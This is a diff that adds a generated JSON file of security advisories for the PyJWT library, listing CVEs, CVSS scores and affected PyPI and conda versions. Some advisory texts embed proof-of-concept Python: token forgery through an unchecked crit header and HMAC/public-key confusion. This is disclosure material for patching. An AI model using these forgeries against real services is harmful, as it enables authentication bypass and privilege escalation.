@@ -1,0 +1,597 @@
+{
+  "schema_version": 1,
+  "package": "pyjwt",
+  "purls": [
+    "pkg:pypi/pyjwt"
+  ],
+  "generated_at": "2026-05-18T06:01:40+00:00",
+  "conda_versions_total": 25,
+  "advisories": [
+    {
+      "id": "GHSA-752w-5fwx-jx9f",
+      "primary_id": "CVE-2026-32597",
+      "aliases": [
+        "CVE-2026-32597"
+      ],
+      "cve_ids": [
+        "CVE-2026-32597"
+      ],
+      "ecosystem": "PyPI",
+      "upstream_name": "pyjwt",
+      "summary": "PyJWT accepts unknown `crit` header extensions",
+      "details": "## Summary\n\nPyJWT does not validate the `crit` (Critical) Header Parameter defined in\nRFC 7515 \u00a74.1.11. When a JWS token contains a `crit` array listing\nextensions that PyJWT does not understand, the library accepts the token\ninstead of rejecting it. This violates the **MUST** requirement in the RFC.\n\nThis is the same class of vulnerability as CVE-2025-59420 (Authlib),\nwhich received CVSS 7.5 (HIGH).\n\n---\n\n## RFC Requirement\n\nRFC 7515 \u00a74.1.11:\n\n> The \"crit\" (Critical) Header Parameter indicates that extensions to this\n> specification and/or [JWA] are being used that **MUST** be understood and\n> processed. [...] If any of the listed extension Header Parameters are\n> **not understood and supported** by the recipient, then the **JWS is invalid**.\n\n---\n\n## Proof of Concept\n\n```python\nimport jwt  # PyJWT 2.8.0\nimport hmac, hashlib, base64, json\n\n# Construct token with unknown critical extension\nheader = {\"alg\": \"HS256\", \"crit\": [\"x-custom-policy\"], \"x-custom-policy\": \"require-mfa\"}\npayload = {\"sub\": \"attacker\", \"role\": \"admin\"}\n\ndef b64url(data):\n    return base64.urlsafe_b64encode(data).rstrip(b\"=\").decode()\n\nh = b64url(json.dumps(header, separators=(\",\", \":\")).encode())\np = b64url(json.dumps(payload, separators=(\",\", \":\")).encode())\nsig = b64url(hmac.new(b\"secret\", f\"{h}.{p}\".encode(), hashlib.sha256).digest())\ntoken = f\"{h}.{p}.{sig}\"\n\n# Should REJECT \u2014 x-custom-policy is not understood by PyJWT\ntry:\n    result = jwt.decode(token, \"secret\", algorithms=[\"HS256\"])\n    print(f\"ACCEPTED: {result}\")\n    # Output: ACCEPTED: {'sub': 'attacker', 'role': 'admin'}\nexcept Exception as e:\n    print(f\"REJECTED: {e}\")\n```\n\n**Expected:** `jwt.exceptions.InvalidTokenError: Unsupported critical extension: x-custom-policy`\n**Actual:** Token accepted, payload returned.\n\n### Comparison with RFC-compliant library\n\n```python\n# jwcrypto \u2014 correctly rejects\nfrom jwcrypto import jwt as jw_jwt, jwk\nkey = jwk.JWK(kty=\"oct\", k=b64url(b\"secret\"))\njw_jwt.JWT(jwt=token, key=key, algs=[\"HS256\"])\n# raises: InvalidJWSObject('Unknown critical header: \"x-custom-policy\"')\n```\n\n---\n\n## Impact\n\n- **Split-brain verification** in mixed-library deployments (e.g., API\n  gateway using jwcrypto rejects, backend using PyJWT accepts)\n- **Security policy bypass** when `crit` carries enforcement semantics\n  (MFA, token binding, scope restrictions)\n- **Token binding bypass** \u2014 RFC 7800 `cnf` (Proof-of-Possession) can be\n  silently ignored\n- See CVE-2025-59420 for full impact analysis\n\n---\n\n## Suggested Fix\n\nIn `jwt/api_jwt.py`, add validation in `_validate_headers()` or\n`decode()`:\n\n```python\n_SUPPORTED_CRIT = {\"b64\"}  # Add extensions PyJWT actually supports\n\ndef _validate_crit(self, headers: dict) -> None:\n    crit = headers.get(\"crit\")\n    if crit is None:\n        return\n    if not isinstance(crit, list) or len(crit) == 0:\n        raise InvalidTokenError(\"crit must be a non-empty array\")\n    for ext in crit:\n        if ext not in self._SUPPORTED_CRIT:\n            raise InvalidTokenError(f\"Unsupported critical extension: {ext}\")\n        if ext not in headers:\n            raise InvalidTokenError(f\"Critical extension {ext} not in header\")\n```\n\n---\n\n## CWE\n\n- CWE-345: Insufficient Verification of Data Authenticity\n- CWE-863: Incorrect Authorization\n\n## References\n\n- [RFC 7515 \u00a74.1.11](https://www.rfc-editor.org/rfc/rfc7515.html#section-4.1.11)\n- [CVE-2025-59420 \u2014 Authlib crit bypass (CVSS 7.5)](https://osv.dev/vulnerability/GHSA-9ggr-2464-2j32)\n- [RFC 7800 \u2014 Proof-of-Possession Key Semantics](https://www.rfc-editor.org/rfc/rfc7800)",
+      "published": "2026-03-13T20:05:04Z",
+      "modified": "2026-05-11T00:41:26.271198299Z",
+      "severity": {
+        "type": "CVSS_V3",
+        "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N"
+      },
+      "all_severity": [
+        {
+          "type": "CVSS_V3",
+          "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N"
+        }
+      ],
+      "references": [
+        {
+          "type": "WEB",
+          "url": "https://github.com/jpadilla/pyjwt/security/advisories/GHSA-752w-5fwx-jx9f"
+        },
+        {
+          "type": "ADVISORY",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-32597"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/jpadilla/pyjwt"
+        },
+        {
+          "type": "WEB",
+          "url": "https://lists.debian.org/debian-lts-announce/2026/05/msg00008.html"
+        }
+      ],
+      "osv_url": "https://osv.dev/vulnerability/GHSA-752w-5fwx-jx9f",
+      "osv_ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "2.12.0"
+            }
+          ]
+        }
+      ],
+      "osv_versions": [
+        "0.1.1",
+        "0.1.2",
+        "0.1.3",
+        "0.1.4",
+        "0.1.5",
+        "0.1.6",
+        "0.1.7",
+        "0.1.8",
+        "0.1.9",
+        "0.2.0",
+        "0.2.1",
+        "0.2.3",
+        "0.3.0",
+        "0.3.1",
+        "0.3.2",
+        "0.4.0",
+        "0.4.1",
+        "0.4.2",
+        "0.4.3",
+        "1.0.0",
+        "1.0.1",
+        "1.1.0",
+        "1.3.0",
+        "1.4.0",
+        "1.4.1",
+        "1.4.2",
+        "1.5.0",
+        "1.5.1",
+        "1.5.2",
+        "1.5.3",
+        "1.6.0",
+        "1.6.1",
+        "1.6.3",
+        "1.6.4",
+        "1.7.0",
+        "1.7.1",
+        "2.0.0",
+        "2.0.0a1",
+        "2.0.0a2",
+        "2.0.1",
+        "2.1.0",
+        "2.10.0",
+        "2.10.1",
+        "2.11.0",
+        "2.2.0",
+        "2.3.0",
+        "2.4.0",
+        "2.5.0",
+        "2.6.0",
+        "2.7.0",
+        "2.8.0",
+        "2.9.0"
+      ],
+      "affected_conda_versions": [
+        "1.4.0",
+        "1.4.2",
+        "1.5.0",
+        "1.5.2",
+        "1.5.3",
+        "1.6.0",
+        "1.6.1",
+        "1.6.3",
+        "1.6.4",
+        "1.7.1",
+        "2.0.0",
+        "2.0.1",
+        "2.1.0",
+        "2.2.0",
+        "2.3.0",
+        "2.4.0",
+        "2.5.0",
+        "2.6.0",
+        "2.7.0",
+        "2.8.0",
+        "2.9.0",
+        "2.10.0",
+        "2.10.1",
+        "2.11.0"
+      ]
+    },
+    {
+      "id": "GHSA-75c5-xw7c-p5pm",
+      "primary_id": "CVE-2024-53861",
+      "aliases": [
+        "CVE-2024-53861"
+      ],
+      "cve_ids": [
+        "CVE-2024-53861"
+      ],
+      "ecosystem": "PyPI",
+      "upstream_name": "pyjwt",
+      "summary": "PyJWT Issuer field partial matches allowed",
+      "details": "### Summary\nThe wrong string if check is run for `iss` checking, resulting in `\"acb\"` being accepted for `\"_abc_\"`.\n\n### Details\nThis is a bug introduced in version [2.10.0](https://github.com/jpadilla/pyjwt/commit/1570e708672aa9036bc772476beae8bfa48f4131#diff-6893ad4a1c5a36b8af3028db8c8bc3b62418149843fc382faf901eaab008e380R366): checking the \"iss\" claim\nchanged from `isinstance(issuer, list)` to `isinstance(issuer,\nSequence)`.\n\n```diff\n-        if isinstance(issuer, list):\n+        if isinstance(issuer, Sequence):\n            if payload[\"iss\"] not in issuer:\n                raise InvalidIssuerError(\"Invalid issuer\")\n        else:\n```\n\nSince str is a Sequnce, but not a list, `in` is also used for string\ncomparison. This results in `if \"abc\" not in \"__abcd__\":` being\nchecked instead of `if \"abc\" != \"__abc__\":`.\n### PoC\nCheck out the unit tests added here: https://github.com/jpadilla/pyjwt-ghsa-75c5-xw7c-p5pm\n```python\n        issuer = \"urn:expected\"\n\n        payload = {\"iss\": \"urn:\"}\n\n        token = jwt.encode(payload, \"secret\")\n\n        # decode() succeeds, even though `\"urn:\" != \"urn:expected\". No exception is raised.\n        with pytest.raises(InvalidIssuerError):\n            jwt.decode(token, \"secret\", issuer=issuer, algorithms=[\"HS256\"])\n```\n\n\n### Impact\n\nI would say the real world impact is not that high, seeing as the signature still has to match. We should still fix it.\n",
+      "published": "2024-12-02T18:34:11Z",
+      "modified": "2026-02-04T02:52:44.350896Z",
+      "severity": {
+        "type": "CVSS_V4",
+        "score": "CVSS:4.0/AV:N/AC:L/AT:P/PR:H/UI:N/VC:N/VI:L/VA:N/SC:N/SI:N/SA:N"
+      },
+      "all_severity": [
+        {
+          "type": "CVSS_V3",
+          "score": "CVSS:3.1/AV:N/AC:H/PR:H/UI:N/S:U/C:N/I:L/A:N"
+        },
+        {
+          "type": "CVSS_V4",
+          "score": "CVSS:4.0/AV:N/AC:L/AT:P/PR:H/UI:N/VC:N/VI:L/VA:N/SC:N/SI:N/SA:N"
+        }
+      ],
+      "references": [
+        {
+          "type": "WEB",
+          "url": "https://github.com/jpadilla/pyjwt/security/advisories/GHSA-75c5-xw7c-p5pm"
+        },
+        {
+          "type": "ADVISORY",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2024-53861"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/jpadilla/pyjwt/commit/1570e708672aa9036bc772476beae8bfa48f4131#diff-6893ad4a1c5a36b8af3028db8c8bc3b62418149843fc382faf901eaab008e380R366"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/jpadilla/pyjwt/commit/33022c25525c1020869c71ce2a4109e44ae4ced1"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/jpadilla/pyjwt"
+        }
+      ],
+      "osv_url": "https://osv.dev/vulnerability/GHSA-75c5-xw7c-p5pm",
+      "osv_ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "2.10.0"
+            },
+            {
+              "fixed": "2.10.1"
+            }
+          ]
+        }
+      ],
+      "osv_versions": [
+        "2.10.0"
+      ],
+      "affected_conda_versions": [
+        "2.10.0"
+      ]
+    },
+    {
+      "id": "GHSA-ffqj-6fqr-9h24",
+      "primary_id": "CVE-2022-29217",
+      "aliases": [
+        "CVE-2022-29217",
+        "PYSEC-2022-202"
+      ],
+      "cve_ids": [
+        "CVE-2022-29217"
+      ],
+      "ecosystem": "PyPI",
+      "upstream_name": "pyjwt",
+      "summary": "Key confusion through non-blocklisted public key formats",
+      "details": "### Impact\n_What kind of vulnerability is it? Who is impacted?_\n\nDisclosed by Aapo Oksman (Senior Security Specialist, Nixu Corporation).\n\n> PyJWT supports multiple different JWT signing algorithms. With JWT, an \n> attacker submitting the JWT token can choose the used signing algorithm.\n> \n> The PyJWT library requires that the application chooses what algorithms \n> are supported. The application can specify \n> \"jwt.algorithms.get_default_algorithms()\" to get support for all \n> algorithms. They can also specify a single one of them (which is the \n> usual use case if calling jwt.decode directly. However, if calling \n> jwt.decode in a helper function, all algorithms might be enabled.)\n> \n> For example, if the user chooses \"none\" algorithm and the JWT checker \n> supports that, there will be no signature checking. This is a common \n> security issue with some JWT implementations.\n> \n> PyJWT combats this by requiring that the if the \"none\" algorithm is \n> used, the key has to be empty. As the key is given by the application \n> running the checker, attacker cannot force \"none\" cipher to be used.\n> \n> Similarly with HMAC (symmetric) algorithm, PyJWT checks that the key is \n> not a public key meant for asymmetric algorithm i.e. HMAC cannot be used \n> if the key begins with \"ssh-rsa\". If HMAC is used with a public key, the \n> attacker can just use the publicly known public key to sign the token \n> and the checker would use the same key to verify.\n> \n>  From PyJWT 2.0.0 onwards, PyJWT supports ed25519 asymmetric algorithm. \n> With ed25519, PyJWT supports public keys that start with \"ssh-\", for \n> example \"ssh-ed25519\".\n\n```python\nimport jwt\nfrom cryptography.hazmat.primitives import serialization\nfrom cryptography.hazmat.primitives.asymmetric import ed25519\n\n# Generate ed25519 private key\nprivate_key = ed25519.Ed25519PrivateKey.generate()\n\n# Get private key bytes as they would be stored in a file\npriv_key_bytes = \nprivate_key.private_bytes(encoding=serialization.Encoding.PEM,format=serialization.PrivateFormat.PKCS8, \nencryption_algorithm=serialization.NoEncryption())\n\n# Get public key bytes as they would be stored in a file\npub_key_bytes = \nprivate_key.public_key().public_bytes(encoding=serialization.Encoding.OpenSSH,format=serialization.PublicFormat.OpenSSH)\n\n# Making a good jwt token that should work by signing it with the \nprivate key\nencoded_good = jwt.encode({\"test\": 1234}, priv_key_bytes, algorithm=\"EdDSA\")\n\n# Using HMAC with the public key to trick the receiver to think that the \npublic key is a HMAC secret\nencoded_bad = jwt.encode({\"test\": 1234}, pub_key_bytes, algorithm=\"HS256\")\n\n# Both of the jwt tokens are validated as valid\ndecoded_good = jwt.decode(encoded_good, pub_key_bytes, \nalgorithms=jwt.algorithms.get_default_algorithms())\ndecoded_bad = jwt.decode(encoded_bad, pub_key_bytes, \nalgorithms=jwt.algorithms.get_default_algorithms())\n\nif decoded_good == decoded_bad:\n \u00a0\u00a0\u00a0 print(\"POC Successfull\")\n\n# Of course the receiver should specify ed25519 algorithm to be used if \nthey specify ed25519 public key. However, if other algorithms are used, \nthe POC does not work\n# HMAC specifies illegal strings for the HMAC secret in jwt/algorithms.py\n#\n#\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 invalid_strings = [\n#\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 b\"-----BEGIN PUBLIC KEY-----\",\n#\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 b\"-----BEGIN CERTIFICATE-----\",\n#\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 b\"-----BEGIN RSA PUBLIC KEY-----\",\n#\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 b\"ssh-rsa\",\n#\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 ]\n#\n# However, OKPAlgorithm (ed25519) accepts the following in \njwt/algorithms.py:\n#\n#\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 if \"-----BEGIN PUBLIC\" in str_key:\n#\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 return load_pem_public_key(key)\n#\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 if \"-----BEGIN PRIVATE\" in str_key:\n#\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 return load_pem_private_key(key, password=None)\n#\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 if str_key[0:4] == \"ssh-\":\n#\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 return load_ssh_public_key(key)\n#\n# These should most likely made to match each other to prevent this behavior\n```\n\n\n```python\nimport jwt\n\n#openssl ecparam -genkey -name prime256v1 -noout -out ec256-key-priv.pem\n#openssl ec -in ec256-key-priv.pem -pubout > ec256-key-pub.pem\n#ssh-keygen -y -f ec256-key-priv.pem > ec256-key-ssh.pub\n\npriv_key_bytes = b\"\"\"-----BEGIN EC PRIVATE KEY-----\nMHcCAQEEIOWc7RbaNswMtNtc+n6WZDlUblMr2FBPo79fcGXsJlGQoAoGCCqGSM49\nAwEHoUQDQgAElcy2RSSSgn2RA/xCGko79N+7FwoLZr3Z0ij/ENjow2XpUDwwKEKk\nAk3TDXC9U8nipMlGcY7sDpXp2XyhHEM+Rw==\n-----END EC PRIVATE KEY-----\"\"\"\n\npub_key_bytes = b\"\"\"-----BEGIN PUBLIC KEY-----\nMFkwEwYHKoZIzj0CAQYIKoZIzj0DAQcDQgAElcy2RSSSgn2RA/xCGko79N+7FwoL\nZr3Z0ij/ENjow2XpUDwwKEKkAk3TDXC9U8nipMlGcY7sDpXp2XyhHEM+Rw==\n-----END PUBLIC KEY-----\"\"\"\n\nssh_key_bytes = b\"\"\"ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJXMtkUkkoJ9kQP8QhpKO/TfuxcKC2a92dIo/xDY6MNl6VA8MChCpAJN0w1wvVPJ4qTJRnGO7A6V6dl8oRxDPkc=\"\"\"\n\n# Making a good jwt token that should work by signing it with the private key\nencoded_good = jwt.encode({\"test\": 1234}, priv_key_bytes, algorithm=\"ES256\")\n\n# Using HMAC with the ssh public key to trick the receiver to think that the public key is a HMAC secret\nencoded_bad = jwt.encode({\"test\": 1234}, ssh_key_bytes, algorithm=\"HS256\")\n\n# Both of the jwt tokens are validated as valid\ndecoded_good = jwt.decode(encoded_good, ssh_key_bytes, algorithms=jwt.algorithms.get_default_algorithms())\ndecoded_bad = jwt.decode(encoded_bad, ssh_key_bytes, algorithms=jwt.algorithms.get_default_algorithms())\n\nif decoded_good == decoded_bad:\n    print(\"POC Successfull\")\nelse:\n    print(\"POC Failed\")\n```\n\n> The issue is not that big as \n> algorithms=jwt.algorithms.get_default_algorithms() has to be used. \n> However, with quick googling, this seems to be used in some cases at \n> least in some minor projects.\n\n### Patches\n\nUsers should upgrade to v2.4.0.\n\n### Workarounds\n\nAlways be explicit with the algorithms that are accepted and expected when decoding.\n\n### References\n_Are there any links users can visit to find out more?_\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue in https://github.com/jpadilla/pyjwt\n* Email Jos\u00e9 Padilla: pyjwt at jpadilla dot com\n",
+      "published": "2022-05-24T22:17:27Z",
+      "modified": "2024-10-15T16:27:42.751871Z",
+      "severity": {
+        "type": "CVSS_V3",
+        "score": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N"
+      },
+      "all_severity": [
+        {
+          "type": "CVSS_V3",
+          "score": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N"
+        }
+      ],
+      "references": [
+        {
+          "type": "WEB",
+          "url": "https://github.com/jpadilla/pyjwt/security/advisories/GHSA-ffqj-6fqr-9h24"
+        },
+        {
+          "type": "ADVISORY",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-29217"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/jpadilla/pyjwt/commit/9c528670c455b8d948aff95ed50e22940d1ad3fc"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/jpadilla/pyjwt"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/jpadilla/pyjwt/releases/tag/2.4.0"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/pypa/advisory-database/tree/main/vulns/pyjwt/PYSEC-2022-202.yaml"
+        },
+        {
+          "type": "WEB",
+          "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/5PK7IQCBVNLYJEFTPHBBPFP72H4WUFNX"
+        },
+        {
+          "type": "WEB",
+          "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/6HIYEYZRQEP6QTHT3EHH3RGFYJIHIMAO"
+        }
+      ],
+      "osv_url": "https://osv.dev/vulnerability/GHSA-ffqj-6fqr-9h24",
+      "osv_ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "1.5.0"
+            },
+            {
+              "fixed": "2.4.0"
+            }
+          ]
+        }
+      ],
+      "osv_versions": [
+        "1.5.0",
+        "1.5.1",
+        "1.5.2",
+        "1.5.3",
+        "1.6.0",
+        "1.6.1",
+        "1.6.3",
+        "1.6.4",
+        "1.7.0",
+        "1.7.1",
+        "2.0.0",
+        "2.0.0a1",
+        "2.0.0a2",
+        "2.0.1",
+        "2.1.0",
+        "2.2.0",
+        "2.3.0"
+      ],
+      "affected_conda_versions": [
+        "1.5.0",
+        "1.5.2",
+        "1.5.3",
+        "1.6.0",
+        "1.6.1",
+        "1.6.3",
+        "1.6.4",
+        "1.7.1",
+        "2.0.0",
+        "2.0.1",
+        "2.1.0",
+        "2.2.0",
+        "2.3.0"
+      ]
+    },
+    {
+      "id": "GHSA-r9jw-mwhq-wp62",
+      "primary_id": "CVE-2017-11424",
+      "aliases": [
+        "CVE-2017-11424",
+        "PYSEC-2017-24"
+      ],
+      "cve_ids": [
+        "CVE-2017-11424"
+      ],
+      "ecosystem": "PyPI",
+      "upstream_name": "pyjwt",
+      "summary": "PyJWT vulnerable to key confusion attacks",
+      "details": "In PyJWT 1.5.0 and below the `invalid_strings` check in `HMACAlgorithm.prepare_key` does not account for all PEM encoded public keys. Specifically, the PKCS1 PEM encoded format would be allowed because it is prefaced with the string `-----BEGIN RSA PUBLIC KEY-----` which is not accounted for. This enables symmetric/asymmetric key confusion attacks against users using the PKCS1 PEM encoded public keys, which would allow an attacker to craft JWTs from scratch.",
+      "published": "2022-05-13T01:42:19Z",
+      "modified": "2024-12-05T05:30:36.784778Z",
+      "severity": {
+        "type": "CVSS_V3",
+        "score": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N"
+      },
+      "all_severity": [
+        {
+          "type": "CVSS_V3",
+          "score": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N"
+        }
+      ],
+      "references": [
+        {
+          "type": "ADVISORY",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2017-11424"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/jpadilla/pyjwt/pull/277"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/jpadilla/pyjwt"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/pypa/advisory-database/tree/main/vulns/pyjwt/PYSEC-2017-24.yaml"
+        },
+        {
+          "type": "WEB",
+          "url": "http://www.debian.org/security/2017/dsa-3979"
+        }
+      ],
+      "osv_url": "https://osv.dev/vulnerability/GHSA-r9jw-mwhq-wp62",
+      "osv_ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "1.5.1"
+            }
+          ]
+        }
+      ],
+      "osv_versions": [
+        "0.1.1",
+        "0.1.2",
+        "0.1.3",
+        "0.1.4",
+        "0.1.5",
+        "0.1.6",
+        "0.1.7",
+        "0.1.8",
+        "0.1.9",
+        "0.2.0",
+        "0.2.1",
+        "0.2.3",
+        "0.3.0",
+        "0.3.1",
+        "0.3.2",
+        "0.4.0",
+        "0.4.1",
+        "0.4.2",
+        "0.4.3",
+        "1.0.0",
+        "1.0.1",
+        "1.1.0",
+        "1.3.0",
+        "1.4.0",
+        "1.4.1",
+        "1.4.2",
+        "1.5.0"
+      ],
+      "affected_conda_versions": [
+        "1.4.0",
+        "1.4.2",
+        "1.5.0"
+      ]
+    },
+    {
+      "id": "PYSEC-2017-24",
+      "primary_id": "CVE-2017-11424",
+      "aliases": [
+        "CVE-2017-11424",
+        "GHSA-r9jw-mwhq-wp62"
+      ],
+      "cve_ids": [
+        "CVE-2017-11424"
+      ],
+      "ecosystem": "PyPI",
+      "upstream_name": "pyjwt",
+      "summary": null,
+      "details": "In PyJWT 1.5.0 and below the `invalid_strings` check in `HMACAlgorithm.prepare_key` does not account for all PEM encoded public keys. Specifically, the PKCS1 PEM encoded format would be allowed because it is prefaced with the string `-----BEGIN RSA PUBLIC KEY-----` which is not accounted for. This enables symmetric/asymmetric key confusion attacks against users using the PKCS1 PEM encoded public keys, which would allow an attacker to craft JWTs from scratch.",
+      "published": "2017-08-24T16:29:00Z",
+      "modified": "2023-11-08T03:58:49.234860Z",
+      "severity": null,
+      "all_severity": [],
+      "references": [
+        {
+          "type": "WEB",
+          "url": "https://github.com/jpadilla/pyjwt/pull/277"
+        },
+        {
+          "type": "ADVISORY",
+          "url": "http://www.debian.org/security/2017/dsa-3979"
+        },
+        {
+          "type": "ADVISORY",
+          "url": "https://github.com/advisories/GHSA-r9jw-mwhq-wp62"
+        }
+      ],
+      "osv_url": "https://osv.dev/vulnerability/PYSEC-2017-24",
+      "osv_ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "1.5.1"
+            }
+          ]
+        }
+      ],
+      "osv_versions": [
+        "0.1.1",
+        "0.1.2",
+        "0.1.3",
+        "0.1.4",
+        "0.1.5",
+        "0.1.6",
+        "0.1.7",
+        "0.1.8",
+        "0.1.9",
+        "0.2.0",
+        "0.2.1",
+        "0.2.3",
+        "0.3.0",
+        "0.3.1",
+        "0.3.2",
+        "0.4.0",
+        "0.4.1",
+        "0.4.2",
+        "0.4.3",
+        "1.0.0",
+        "1.0.1",
+        "1.1.0",
+        "1.3.0",
+        "1.4.0",
+        "1.4.1",
+        "1.4.2",
+        "1.5.0"
+      ],
+      "affected_conda_versions": [
+        "1.4.0",
+        "1.4.2",
+        "1.5.0"
+      ]
+    },
+    {
+      "id": "PYSEC-2022-202",
+      "primary_id": "CVE-2022-29217",
+      "aliases": [
+        "CVE-2022-29217",
+        "GHSA-ffqj-6fqr-9h24"
+      ],
+      "cve_ids": [
+        "CVE-2022-29217"
+      ],
+      "ecosystem": "PyPI",
+      "upstream_name": "pyjwt",
+      "summary": null,
+      "details": "PyJWT is a Python implementation of RFC 7519. PyJWT supports multiple different JWT signing algorithms. With JWT, an attacker submitting the JWT token can choose the used signing algorithm. The PyJWT library requires that the application chooses what algorithms are supported. The application can specify `jwt.algorithms.get_default_algorithms()` to get support for all algorithms, or specify a single algorithm. The issue is not that big as `algorithms=jwt.algorithms.get_default_algorithms()` has to be used. Users should upgrade to v2.4.0 to receive a patch for this issue. As a workaround, always be explicit with the algorithms that are accepted and expected when decoding.",
+      "published": "2022-05-24T15:15:00Z",
+      "modified": "2023-11-08T04:09:10.999573Z",
+      "severity": null,
+      "all_severity": [],
+      "references": [
+        {
+          "type": "ADVISORY",
+          "url": "https://github.com/jpadilla/pyjwt/security/advisories/GHSA-ffqj-6fqr-9h24"
+        },
+        {
+          "type": "FIX",
+          "url": "https://github.com/jpadilla/pyjwt/commit/9c528670c455b8d948aff95ed50e22940d1ad3fc"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/jpadilla/pyjwt/releases/tag/2.4.0"
+        },
+        {
+          "type": "WEB",
+          "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/6HIYEYZRQEP6QTHT3EHH3RGFYJIHIMAO/"
+        },
+        {
+          "type": "WEB",
+          "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/5PK7IQCBVNLYJEFTPHBBPFP72H4WUFNX/"
+        }
+      ],
+      "osv_url": "https://osv.dev/vulnerability/PYSEC-2022-202",
+      "osv_ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "1.5.0"
+            },
+            {
+              "fixed": "2.4.0"
+            }
+          ]
+        }
+      ],
+      "osv_versions": [
+        "1.5.0",
+        "1.5.1",
+        "1.5.2",
+        "1.5.3",
+        "1.6.0",
+        "1.6.1",
+        "1.6.3",
+        "1.6.4",
+        "1.7.0",
+        "1.7.1",
+        "2.0.0",
+        "2.0.0a1",
+        "2.0.0a2",
+        "2.0.1",
+        "2.1.0",
+        "2.2.0",
+        "2.3.0"
+      ],
+      "affected_conda_versions": [
+        "1.5.0",
+        "1.5.2",
+        "1.5.3",
+        "1.6.0",
+        "1.6.1",
+        "1.6.3",
+        "1.6.4",
+        "1.7.1",
+        "2.0.0",
+        "2.0.1",
+        "2.1.0",
+        "2.2.0",
+        "2.3.0"
+      ]
+    }
+  ]
+}
